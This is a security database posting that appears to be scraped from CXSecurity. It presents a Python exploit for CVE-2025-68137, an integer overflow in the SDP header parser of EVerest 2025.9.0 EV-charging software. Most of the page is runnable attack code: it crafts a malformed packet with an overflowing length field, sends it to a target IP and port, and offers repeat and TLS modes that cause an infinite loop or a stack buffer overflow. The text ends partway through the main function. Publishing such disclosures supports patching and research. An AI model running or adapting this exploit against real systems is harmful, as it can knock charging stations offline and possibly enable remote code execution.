---
title: EVerest 2025.9.0 DoS
url: https://cxsecurity.com/issue/WLB-2026090003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-06
fetch_date: 2026-09-07T06:48:04.539028
---

# EVerest 2025.9.0 DoS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **EVerest 2025.9.0 DoS** **2026.09.06**  Credit:  **[[Ranjit Kumar Singh]](https://cxsecurity.com/author/%5BRanjit%2BKumar%2BSingh%5D/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-68137](https://cxsecurity.com/cveshow/CVE-2025-68137/ "Click to see CVE-2025-68137")**  CWE: **N/A** | |

# Exploit Title: EVerest 2025.9.0 - DoS
# Date: 2026-08-11
# Exploit Author: [Ranjit Kumar Singh]
# Vendor Homepage: https://github.com/EVerest/everest-core
# Software Link:
https://github.com/EVerest/everest-core/archive/refs/tags/2025.9.0.tar.gz
# Version: everest-core < 2025.10.0
# Tested on: Ubuntu 22.04 / EVerest 2025.9.0
# CVE: CVE-2025-68137
# Attack Vector: Adjacent Network
# Authentication: None
"""
CVE-2025-68137 - EVerest SDP Integer Overflow → Stack Buffer Overflow / DoS
Exploit Author: Ranjit Kumar Singh
Vendor: https://github.com/EVerest/everest-core
Software Link: https://github.com/EVerest/everest-core/archive/refs/tags/2025.9.0.tar.gz
Vulnerable Versions: EVerest everest-core < 2025.10.0
Tested on: Linux (Ubuntu 22.04) / EVerest 2025.9.0
CVE: CVE-2025-68137
Description:
An integer overflow in SdpPacket::parse\_header() allows an attacker to
trigger either an infinite loop (TCP) or stack buffer overflow (TLS)
by sending a malformed SDP packet with a specially crafted length field.
The vulnerability exists because the length field (4 bytes) is added to
the header size (8) without proper overflow checking. When the length
value is near UINT\_MAX, the addition overflows, causing the remaining
bytes to read to be interpreted as SIZE\_MAX.
Usage:
# Trigger DoS (infinite loop) on TCP server
python3 CVE-2025-68137.py -t 192.168.1.100 -p 5200
# Trigger stack buffer overflow on TLS server (may lead to RCE)
python3 CVE-2025-68137.py -t 192.168.1.100 -p 5200 --tls
# Send multiple packets to increase impact
python3 CVE-2025-68137.py -t 192.168.1.100 -p 5200 --count 100
# Custom SDP version bytes (for testing different implementations)
python3 CVE-2025-68137.py -t 192.168.1.100 -p 5200 --version 0x01 --inverse 0xFE
"""
import argparse
import socket
import ssl
import struct
import time
import sys
# SDP Protocol Constants
SDP\_PROTOCOL\_VERSION = 0x01
SDP\_INVERSE\_PROTOCOL\_VERSION = 0xFE
V2GTP\_HEADER\_SIZE = 8
def build\_malicious\_sdp\_packet(version=0x01, inverse=0xFE):
"""
Build a malformed SDP packet that triggers the integer overflow.
The packet structure:
- Byte 0: Protocol version (must be 0x01)
- Byte 1: Inverse protocol version (must be 0xFE)
- Byte 2-3: Reserved/Unused (0x0000)
- Byte 4-7: Length field (triggers overflow when +8 is applied)
The overflow occurs when the length field is near UINT\_MAX.
When the code does: length = be32toh(tmp) + V2GTP\_HEADER\_SIZE
If tmp is close to UINT\_MAX, the addition overflows.
We use 0xFFFFFFFF - 7 to make length = 0 after overflow,
then length - bytes\_read becomes negative → SIZE\_MAX.
"""
# Trigger integer overflow: tmp + 8 overflows when tmp >= UINT\_MAX - 7
# UINT\_MAX = 0xFFFFFFFF
overflow\_value = 0xFFFFFFF8 # UINT\_MAX - 7
# Build the packet
packet = bytearray()
packet.append(version) # Protocol version
packet.append(inverse) # Inverse protocol version
packet.extend(b'\x00\x00') # Reserved (2 bytes)
packet.extend(struct.pack('>I', overflow\_value)) # Length (big-endian)
return bytes(packet)
def build\_normal\_sdp\_packet(version=0x01, inverse=0xFE, payload\_size=0):
"""
Build a normal SDP packet for comparison/testing.
"""
packet = bytearray()
packet.append(version)
packet.append(inverse)
packet.extend(b'\x00\x00')
packet.extend(struct.pack('>I', payload\_size))
return bytes(packet)
def send\_packet(target\_ip, target\_port, packet, use\_tls=False, count=1):
"""
Send the malformed SDP packet to the target.
"""
success\_count = 0
fail\_count = 0
for i in range(count):
try:
# Create socket
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.settimeout(10)
# Wrap with TLS if requested
if use\_tls:
context = ssl.create\_default\_context()
context.check\_hostname = False
context.verify\_mode = ssl.CERT\_NONE
sock = context.wrap\_socket(sock, server\_hostname=target\_ip)
# Connect and send
sock.connect((target\_ip, target\_port))
sock.send(packet)
# Try to read response (may hang if infinite loop triggered)
try:
response = sock.recv(1024)
print(f"[{i+1}/{count}] Response received ({len(response)} bytes)")
except socket.timeout:
print(f"[{i+1}/{count}] Timeout - possible DoS/loop triggered")
sock.close()
success\_count += 1
except ConnectionRefusedError:
print(f"[{i+1}/{count}] Connection refused - service may be down")
fail\_count += 1
except socket.timeout:
print(f"[{i+1}/{count}] Connection timeout")
fail\_count += 1
except Exception as e:
print(f"[{i+1}/{count}] Error: {e}")
fail\_count += 1
# Small delay between packets
if i < count - 1:
time.sleep(0.1)
return success\_count, fail\_count
def main():
parser = argparse.ArgumentParser(
description="CVE-2025-68137 - EVerest SDP Integer Overflow Exploit"
)
parser.add\_argument("-t", "--target", required=True,
help="Target IP address (e.g., 192.168.1.100)")
parser.add\_argument("-p", "--port", type=int, default=5200,
help="Target port (default: 5200)")
parser.add\_argument("--tls", action="store\_true",
help="Use TLS connection (triggers stack buffer overflow)")
parser.add\_argument("--count", type=int, default=1,
help="Number of packets to send (default: 1)")
parser.add\_argument("--version", type=lambda x: int(x, 0), default=0x01,
help="Protocol version byte (default: 0x01)")
parser.add\_argument("--inverse", type=lambda x: int(x, 0), default=0xFE,
help="Inverse protocol version byte (default: 0xFE)")
parser.add\_argument("--payload-size", type=int, default=0,
help="Payload size for normal packets (for testing)")
parser.add\_argument("--normal", action="store\_true",
help="Send normal packet instead of malicious")
args = parser.parse\_args()
print("=" \* 60)
print("CVE-2025-68137 - EVerest SDP Integer Overflow Exploit")
print("=" \* 60)
print(f"Target: {args.target}:{args.port}")
print(f"TLS: {'Enabled' if args.tls else 'Disabled'}")
print(f"Packets: {ar...